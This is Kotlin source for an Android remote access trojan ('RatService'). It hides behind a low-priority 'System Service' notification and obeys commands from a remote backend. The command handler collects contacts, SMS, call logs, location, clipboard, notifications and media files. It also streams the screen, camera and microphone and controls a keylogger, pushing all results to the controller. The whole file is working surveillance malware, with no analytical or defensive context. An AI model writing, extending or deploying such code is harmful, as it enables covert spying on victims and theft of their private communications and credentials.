package com.ratio.ratapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class RatService : Service() {

    companion object {
        const val ACTION_START = "start"
        const val ACTION_STOP = "stop"
        const val CHANNEL_ID = "sys_svc"
        const val NOTIF_ID = 101
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var heartbeatJob: Job? = null
    private var cmdJob: Job? = null

    private var screen: ScreenCap? = null
    private var camera: CameraCap? = null
    private var audio: AudioCap? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForegroundCompat()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf(); return START_NOT_STICKY
        }
        Fire.initDeviceId(this)
        if (screen == null) screen = ScreenCap(this)
        if (camera == null) camera = CameraCap(this)
        if (audio == null) audio = AudioCap(this)

        val res = intent?.getIntExtra("proj_result", 0) ?: 0
        @Suppress("DEPRECATION")
        val data = intent?.getParcelableExtra<Intent>("proj_data")
        if (res != 0 && data != null) screen!!.setProjectionResult(res, data)

        if (heartbeatJob == null) heartbeatLoop()
        if (cmdJob == null) commandLoop()
        return START_STICKY
    }

    private fun startForegroundCompat() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false)
            nm.createNotificationChannel(ch)
        }
        val notif: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIF_ID, notif,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    private fun heartbeatLoop() {
        heartbeatJob = scope.launch {
            while (isActive) {
                try {
                    Fire.pushStatus(mapOf(
                        "online" to true,
                        "last_seen" to System.currentTimeMillis(),
                        "battery" to Collectors.battery(this@RatService),
                        "screen_on" to Collectors.screenOn(this@RatService)
                    ))
                    Fire.pushHeartbeat(Collectors.deviceInfo(this@RatService))
                } catch (_: Throwable) {}
                delay(15_000)
            }
        }
    }

    private fun commandLoop() {
        cmdJob = scope.launch {
            Fire.listenCommandsFlow().collect { (cmdId, cmd) ->
                val type = cmd["type"] as? String ?: return@collect
                try {
                    Fire.markCommandRunning(cmdId)
                    handle(cmdId, type, cmd)
                    Fire.markCommandDone(cmdId)
                } catch (t: Throwable) {
                    Fire.markCommandFailed(cmdId, t.message ?: "err")
                }
            }
        }
    }

    private fun handle(cmdId: String, type: String, cmd: Map<String, Any?>) {
        val args = cmd
        when (type) {
            "ping" -> Fire.pushResponse(cmdId, mapOf("pong" to System.currentTimeMillis()))
            "info" -> Fire.pushResponse(cmdId, Collectors.deviceInfo(this))
            "contacts" -> Fire.pushResponse(cmdId, Collectors.contacts(this))
            "sms_list" -> Fire.pushResponse(cmdId, Collectors.sms(this, limit = 300))
            "sms_live_start" -> Collectors.startSmsWatch(this, scope) { Fire.pushResponse(cmdId, it) }
            "calllog" -> Fire.pushResponse(cmdId, Collectors.callLog(this))
            "location" -> Fire.pushResponse(cmdId, Collectors.location(this))
            "apps" -> Fire.pushResponse(cmdId, Collectors.apps(this))
            "media_list" -> Fire.pushResponse(cmdId, Collectors.mediaList(this))
            "media_get" -> {
                val path = args["path"] as? String ?: return
                Fire.pushResponse(cmdId, Collectors.mediaGet(path))
            }
            "clipboard" -> Fire.pushResponse(cmdId, Collectors.clipboard(this))
            "notifications" -> Fire.pushResponse(cmdId, Collectors.notifications(this))

            "screen_start" -> {
                screen?.startStream(
                    intervalMs = (args["interval"] as? Long)?.toInt() ?: 1500
                ) { b64 -> Fire.screenFrame(b64) }
            }
            "screen_stop" -> screen?.stop()
            "screenshot" -> {
                screen?.captureOnce { b64 -> Fire.pushResponse(cmdId, mapOf("image" to b64)) }
            }

            "cam_start" -> {
                val facing = args["facing"] as? String ?: "back"
                camera?.startStream(facing, (args["interval"] as? Long)?.toInt() ?: 1000) { b64 ->
                    Fire.cameraFrame(b64, facing)
                }
            }
            "cam_stop" -> camera?.stop()
            "cam_photo" -> {
                val facing = args["facing"] as? String ?: "back"
                camera?.captureOnce(facing) { b64 -> Fire.pushResponse(cmdId, mapOf("image" to b64)) }
            }

            "mic_start" -> audio?.startStream { b64, seq -> Fire.audioChunk(b64, seq) }
            "mic_stop" -> audio?.stop()
            "mic_record" -> {
                val durMs = (args["duration"] as? Long) ?: 10_000L
                audio?.recordOnce(durMs) { b64 ->
                    Fire.pushResponse(cmdId, mapOf("audio" to b64))
                }
            }

            "toast" -> Collectors.toast(this, args["msg"] as? String ?: "")
            "vibrate" -> Collectors.vibrate(this, (args["ms"] as? Long) ?: 1000L)
            "open_url" -> Collectors.openUrl(this, args["url"] as? String ?: "")

            "keylog_start" -> KeylogService.setEnabled(this, true)
            "keylog_stop" -> KeylogService.setEnabled(this, false)
            "keylog_dump" -> Fire.pushResponse(cmdId, KeylogService.dump())
            "keylog_clear" -> { KeylogService.clear(); Fire.pushResponse(cmdId, "cleared") }

            else -> Fire.pushResponse(cmdId, mapOf("error" to "unknown command"))
        }
    }

    override fun onDestroy() {
        scope.cancel()
        screen?.stop(); camera?.stop(); audio?.stop()
        super.onDestroy()
    }
}